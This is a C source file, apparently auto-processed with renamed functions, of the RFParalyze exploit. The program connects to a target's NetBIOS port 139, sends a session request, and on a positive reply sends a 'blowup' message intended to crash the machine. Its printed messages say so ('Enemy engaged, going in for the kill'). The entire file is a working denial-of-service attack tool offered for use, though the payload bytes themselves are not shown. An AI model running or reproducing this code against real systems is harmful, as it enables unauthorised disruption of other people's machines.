#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct sreq {int /*<<< orphan*/  yoname; int /*<<< orphan*/  myname; int /*<<< orphan*/  end; int /*<<< orphan*/  sep; int /*<<< orphan*/  first; } ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; TYPE_1__ sin_addr; } ;
typedef  int /*<<< orphan*/  sin ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  FUNC0 (char*,char*) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 struct sreq blowup ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (int,struct sockaddr_in*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int FUNC10 (int,char*,int) ; 
 int FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  FUNC13 (int,struct sreq*,int) ; 

int FUNC14(int argc, char *argv[]){
char buf[4000], myname[33], yoname[33];
struct sockaddr_in sin;
int sox, connex, x;
struct sreq smbreq;

FUNC9("RFParalyze -- this code by rfp/ADM/Wiretrip/ and dm/el8/\n");

if (argc < 3) {
FUNC9("Usage: RFParalyze <IP of target> <NetBIOS name>\n");
FUNC9("       --IP must be ip address, not dns\n");
FUNC9("       --NetBIOS name must be in UPPER CASE\n\n");
FUNC3(1);}

FUNC9("Greetz to el8.org, Technotronic, w00w00, USSR, and ADM!\n");

FUNC0("WICCA",myname);  /* greetz to Simple Nomad/NMRC */
myname[30]='A';	           /* how was Beltaine? :)        */
myname[31]='D';

FUNC0(argv[2],yoname);
yoname[30]='A';
yoname[31]='D';
FUNC9("Trying %s as NetBIOS name %s \n",argv[1],argv[2]);

sin.sin_addr.s_addr = FUNC5(argv[1]);
sin.sin_family      = AF_INET;
sin.sin_port        = FUNC4(139);

sox = FUNC11(AF_INET,SOCK_STREAM,0);
if((connex = FUNC2(sox,(struct sockaddr_in *)&sin,sizeof(sin))) < 0){
    FUNC8("Problems connecting: ");
    FUNC3(1);}

FUNC7(buf,0,4000);

FUNC6(smbreq.first,"\x81\x00\x00\x44\x20",5); /*various netbios stuffz*/
FUNC6(smbreq.sep,"\x00\x20",2);               /*no need to worry about*/
FUNC6(smbreq.end,"\x00",1);                   /*what it does :)       */
FUNC12(smbreq.myname,myname,32);
FUNC12(smbreq.yoname,yoname,32);

FUNC13(sox,&smbreq,72);  /* send initial request */
x=FUNC10(sox,buf,4000);   /* get their response   */

if(x<1){ FUNC9("Problem, didn't get response\n");
        FUNC3(1);}

if(buf[0]=='\x82') FUNC9("Enemy engaged, going in for the kill...");
else {FUNC9("We didn't get back the A-OK, bailing.\n");
        FUNC3(1);}

FUNC13(sox,&blowup,72);  /* send the magic message >:)     */
x=FUNC10(sox,buf,4000);   /* we really don't care, but sure */
FUNC1(sox);
FUNC9("done\n");
}